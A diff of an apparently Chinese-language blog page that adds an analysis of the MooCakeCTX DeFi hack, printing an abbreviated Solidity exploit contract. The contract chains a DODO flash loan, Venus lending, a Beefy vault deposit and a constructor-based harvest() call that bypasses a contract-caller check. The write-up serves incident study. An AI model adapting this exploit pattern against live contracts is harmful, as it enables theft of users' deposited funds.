@@ -214,9 +214,59 @@ https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a
   </li>
 </ul>
 
-<h3 id="moocakectx-exp细节解析">MooCakeCTX exp细节解析</h3>
+<h3 id="moocakectx-exp解析">MooCakeCTX exp解析</h3>
+<p><a href="https://github.com/SunWeb3Sec/DeFiHackLabs">exp提供者</a></p>
 
-<p>(待更新)</p>
+<p>moocakeCTX exp只包含大体结构,代码省略了部分不关键的地方：</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//接口实现+其他接口</span>
+<span class="kr">interface</span> <span class="nx">StrategySyrup</span> <span class="p">{...}</span>
+
+<span class="nx">contract</span> <span class="nx">Harvest</span> <span class="p">{</span>
+    <span class="c1">//构造函数中执行来绕过</span>
+    <span class="kd">constructor</span><span class="p">(){</span>
+        <span class="nx">StrategySyrup</span> <span class="nx">strategySyrup</span> <span class="o">=</span> <span class="nx">StrategySyrup</span><span class="p">(...);</span>
+        <span class="nx">strategySyrup</span><span class="p">.</span><span class="nx">harvest</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="nx">contract</span> <span class="nx">exp</span> <span class="p">{</span>
+    <span class="kd">function</span> <span class="nx">Exploit</span><span class="p">()</span> <span class="kr">public</span> <span class="p">{</span>
+        <span class="c1">//交换一点CTK</span>
+        <span class="nx">WBNBToCTK</span><span class="p">();</span>
+        <span class="nx">CTK</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">SmartChef</span><span class="p">),</span> <span class="nx">CTK</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+        <span class="c1">//执行dodo的闪电贷</span>
+        <span class="nx">DVM</span><span class="p">(</span><span class="nx">dodo</span><span class="p">).</span><span class="nx">flashLoan</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">400</span><span class="nx">_000</span> <span class="o">*</span> <span class="mi">1</span><span class="nx">e18</span><span class="p">,</span> <span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">),</span> <span class="k">new</span> <span class="nx">bytes</span><span class="p">(</span><span class="mi">1</span><span class="p">));</span>
+    <span class="p">}</span>
+
+    <span class="c1">//回调函数中执行逻辑</span>
+    <span class="kd">function</span> <span class="nx">DPPFlashLoanCall</span><span class="p">(</span><span class="nx">address</span> <span class="nx">sender</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">baseAmount</span><span class="p">,</span> <span class="nx">uint256</span> <span class="nx">quoteAmount</span><span class="p">,</span> <span class="nx">bytes</span> <span class="nx">calldata</span> <span class="nx">data</span><span class="p">)</span> <span class="nx">external</span><span class="p">{</span>
+        <span class="nx">address</span> <span class="p">[]</span> <span class="nx">memory</span> <span class="nx">cTokens</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+        <span class="nx">cTokens</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">vBUSD</span><span class="p">);</span>
+        <span class="nx">cTokens</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nx">address</span><span class="p">(</span><span class="nx">vCAKE</span><span class="p">);</span>
+        <span class="c1">//控制器token的格式数组</span>
+        <span class="nx">unitroller</span><span class="p">.</span><span class="nx">enterMarkets</span><span class="p">(</span><span class="nx">cTokens</span><span class="p">);</span>
+        <span class="nx">BUSD</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vBUSD</span><span class="p">),</span> <span class="nx">type</span><span class="p">(</span><span class="nx">uint</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+        <span class="c1">//mintVBUSD</span>
+        <span class="nx">vBUSD</span><span class="p">.</span><span class="nx">mint</span><span class="p">(</span><span class="nx">BUSD</span><span class="p">.</span><span class="nx">balanceOf</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="k">this</span><span class="p">)));</span>
+        <span class="c1">//借VCake</span>
+        <span class="nx">vCAKE</span><span class="p">.</span><span class="nx">borrow</span><span class="p">(</span><span class="mi">50</span><span class="nx">_000</span> <span class="o">*</span> <span class="mi">1</span><span class="nx">e18</span><span class="p">);</span>
+        <span class="nx">CAKE</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">beefyVault</span><span class="p">),</span> <span class="nx">type</span><span class="p">(</span><span class="nx">uint</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+        <span class="c1">//viper合约中质押所有</span>
+        <span class="nx">beefyVault</span><span class="p">.</span><span class="nx">depositAll</span><span class="p">();</span>
+        <span class="c1">//初始化并且执行，绕过。</span>
+        <span class="nx">Harvest</span> <span class="nx">harvest</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Harvest</span><span class="p">();</span>
+        <span class="c1">//取走</span>
+        <span class="nx">beefyVault</span><span class="p">.</span><span class="nx">withdrawAll</span><span class="p">();</span>
+        <span class="c1">//偿还</span>
+        <span class="nx">CAKE</span><span class="p">.</span><span class="nx">approve</span><span class="p">(</span><span class="nx">address</span><span class="p">(</span><span class="nx">vCAKE</span><span class="p">),</span> <span class="nx">type</span><span class="p">(</span><span class="nx">uint</span><span class="p">).</span><span class="nx">max</span><span class="p">);</span>
+        <span class="nx">vCAKE</span><span class="p">.</span><span class="nx">repayBorrow</span><span class="p">(</span><span class="mi">50</span><span class="nx">_000</span> <span class="o">*</span> <span class="mi">1</span><span class="nx">e18</span><span class="p">);</span>
+        <span class="nx">vBUSD</span><span class="p">.</span><span class="nx">redeemUnderlying</span><span class="p">(</span><span class="mi">400</span><span class="nx">_000</span> <span class="o">*</span> <span class="mi">1</span><span class="nx">e18</span><span class="p">);</span>
+        <span class="c1">//归还闪电贷</span>
+        <span class="nx">BUSD</span><span class="p">.</span><span class="nx">transfer</span><span class="p">(</span><span class="nx">dodo</span><span class="p">,</span> <span class="mi">400</span><span class="nx">_000</span> <span class="o">*</span> <span class="mi">1</span><span class="nx">e18</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
 
   <!-- 引入share模块 -->
   
@@ -312,7 +362,7 @@ https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a
     2018
     -
   
-  2022
+  2023
   <br>
   Powered by <a href="https://www.jekyll.com.cn/">Jekyll</a> | <a href="https://github.com/xukimseven/HardCandy-Jekyll">HardCandy-Jekyll</a></span>
 </footer>
